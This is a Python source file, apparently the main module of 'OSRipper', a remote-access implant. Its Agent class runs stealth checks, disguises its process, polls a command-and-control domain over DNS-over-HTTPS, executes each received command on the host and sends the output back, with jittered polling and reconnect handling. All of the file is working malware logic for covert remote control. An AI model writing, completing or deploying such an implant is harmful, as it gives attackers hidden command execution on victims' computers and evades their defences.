#!/usr/bin/env python3
"""
Main Agent Module
Core payload orchestrator that ties together all components
"""

import sys
import time
import random
import platform
from .doh_client import DoHClient
from .stealth import Stealth
from .executor import CommandExecutor
from .session import SessionManager


class Agent:
    """Main agent orchestrator."""
    
    def __init__(self, domain, stealth_delay=False, doh_endpoint=None):
        """
        Initialize agent.
        
        Args:
            domain: C2 domain name
            stealth_delay: If True, add random delay at startup
            doh_endpoint: Custom DoH endpoint (optional)
        """
        self.domain = domain
        self.stealth_delay = stealth_delay
        self.doh_endpoint = doh_endpoint
        self.is_windows = platform.system() == 'Windows'
        
        # Initialize components
        self.stealth = Stealth()
        self.session_manager = SessionManager()
        self.executor = CommandExecutor()
        self.doh_client = None
        
        self.running = False
        
    def _debug_print(self, message):
        """Print debug message only on Windows."""
        # Debug statements disabled
        pass
    
    def initialize(self):
        """Initialize agent and run stealth checks."""
        self._debug_print("[*] Initializing agent...")
        # Add stealth delay if requested
        if self.stealth_delay:
            self._debug_print("[*] Adding stealth delay...")
            self.stealth.add_delay(5, 15)
        
        # Run stealth checks
        self._debug_print("[*] Running stealth checks...")
        if not self.stealth.check_all():
            self._debug_print("[!] Stealth checks failed, exiting")
            sys.exit(1)
        self._debug_print("[+] Stealth checks passed")
        
        # Attempt process masquerading
        self.stealth.masquerade_process()
        
        # Load or create session
        self._debug_print("[*] Loading session...")
        session_id = self.session_manager.load_session()
        if not session_id:
            self._debug_print("[*] No existing session, creating new one...")
            session_id = self.session_manager.create_session()
        else:
            self._debug_print(f"[+] Loaded existing session: {session_id[:16]}...")
        
        # Initialize DoH client
        self.doh_client = DoHClient(
            domain=self.domain,
            session_id=session_id,
            doh_endpoint=self.doh_endpoint
        )
        
        self._debug_print("[+] Agent initialized successfully")
        return True
    
    def run(self):
        """Main agent loop."""
        self._debug_print("[*] Starting agent run loop...")
        if not self.initialize():
            self._debug_print("[!] Initialization failed")
            return
        
        self.running = True
        self._debug_print("[+] Agent running, entering main loop...")
        loop_count = 0
        
        while self.running:
            try:
                loop_count += 1
                self._debug_print(f"[*] Loop iteration {loop_count}")
                
                # Get command from C2
                command = self.doh_client.get_command()
                
                if command:
                    self._debug_print(f"[+] Processing command: {command}")
                    # Process command
                    self._process_command(command)
                    
                    # Update contact time
                    self.session_manager.update_contact()
                else:
                    self._debug_print("[*] No command received")
                    # No command, add small delay
                    self.stealth.randomize_timing()
                
                # Get polling delay with jitter
                delay = self.doh_client.get_polling_delay()
                self._debug_print(f"[*] Sleeping for {delay} seconds...")
                time.sleep(delay)
                
            except KeyboardInterrupt:
                self._debug_print("[*] Keyboard interrupt received, shutting down...")
                self.running = False
                break
            except Exception as e:
                self._debug_print(f"[!] Exception in run loop: {e}")
                import traceback
                traceback.print_exc()
                # On error, increment reconnect count and wait
                self.session_manager.increment_reconnect()
                reconnect_delay = self.session_manager.get_reconnect_delay()
                self._debug_print(f"[*] Reconnecting in {reconnect_delay} seconds...")
                time.sleep(reconnect_delay)
    
    def _process_command(self, command):
        """
        Process command from C2 server.
        
        Args:
            command: Command string to execute
        """
        try:
            # Handle special commands
            if command == '__TERMINATE__':
                # Session was deleted - terminate and clean up
                self.session_manager.clear_session()
                self.running = False
                sys.exit(0)
            elif command == 'exit':
                self.running = False
                return
            elif command == 'ping':
                # Heartbeat
                self.doh_client.send_response('pong')
                return
            
            # Execute command
            result = self.executor.execute(command)
            
            # Format response
            response = self.executor.format_response(result)
            
            # Send response back to C2
            self.doh_client.send_response(response)
            
        except Exception:
            # On error, send error response
            error_response = "STDERR:Command execution failed"
            self.doh_client.send_response(error_response)


def main():
    """Main entry point for agent."""
    import argparse
    
    parser = argparse.ArgumentParser(description='OSRipper DoH Agent')
    parser.add_argument('domain', help='C2 domain name')
    parser.add_argument('--delay', action='store_true', help='Add stealth delay')
    parser.add_argument('--doh-endpoint', help='Custom DoH endpoint URL')
    
    args = parser.parse_args()
    
    # Create and run agent
    agent = Agent(
        domain=args.domain,
        stealth_delay=args.delay,
        doh_endpoint=args.doh_endpoint
    )
    
    agent.run()


if __name__ == '__main__':
    main()

